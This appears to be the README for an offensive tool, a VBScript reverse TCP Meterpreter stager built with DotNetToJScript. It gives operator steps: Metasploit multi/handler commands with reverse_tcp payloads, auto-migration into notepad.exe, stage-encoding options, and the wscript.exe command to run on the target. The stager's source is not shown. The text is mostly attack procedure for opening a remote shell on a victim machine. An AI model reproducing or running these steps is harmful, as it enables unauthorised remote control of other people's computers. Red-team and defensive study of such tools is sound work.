```
____   ______________  _________   _____          __                
\   \ /   /\______   \/   _____/  /     \   _____/  |_  ___________ 
 \   Y   /  |    |  _/\_____  \  /  \ /  \_/ __ \   __\/ __ \_  __ \
  \     /   |    |   \/        \/    Y    \  ___/|  | \  ___/|  | \/
   \___/    |______  /_______  /\____|__  /\___  >__|  \___  >__|   
                   \/        \/         \/     \/          \/       
```
### VBS Reversed TCP Meterpreter Stager - by Cn33liz 2017
CSharp Meterpreter Stager build by Cn33liz and embedded within VBScript using DotNetToJScript from James Forshaw
https://github.com/tyranid/DotNetToJScript

This Stager should run on x86 as well as x64

```
Usage:
Change RHOST and RPORT settings to suit your needs.

Start Msfconsole:
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp <- When run from x64 version of wscript.exe
set PAYLOAD windows/meterpreter/reverse_tcp <- When run from x86 version of wscript.exe
set LHOST 0.0.0.0
set LPORT 443
set AutoRunScript post/windows/manage/migrate NAME=notepad.exe
set EnableUnicodeEncoding true
set EnableStageEncoding true
set ExitOnSession false
exploit -j

Then run: wscript.exe VBSMeter.vbs on Target
```
